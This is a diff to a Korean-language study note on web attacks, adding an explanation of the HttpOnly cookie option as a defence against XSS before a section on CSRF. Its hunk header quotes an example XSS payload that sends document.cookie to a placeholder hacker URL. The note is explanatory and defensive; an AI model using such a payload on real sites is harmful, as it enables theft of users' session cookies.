@@ -28,6 +28,16 @@ http://mysite.com?search=<script>location.href("{해커의 URL}?value="+document
 
 
 
+XSS 공격을 방지하는 방법에 대해 알아봅시다.
+
+### HttpOnly
+
+HttpOnly 옵션은 자바스크립트의 document.cookie를 이용해서 쿠키에 접속하는 것을 막는 옵션입니다.
+
+악성 스크립트가 실행이 되더라도 해당 속성이 있다면 쿠키에 접근을 못하므로 쿠키의 탈취를 막을 수 있습니다.
+
+
+
 ## CSRF Attack
 
 CSRF는 Cross Site Request Forgery의 줄임말로 사용자가 자신의 의도와 다른 행위를 요청하도록 하는 공격입니다.
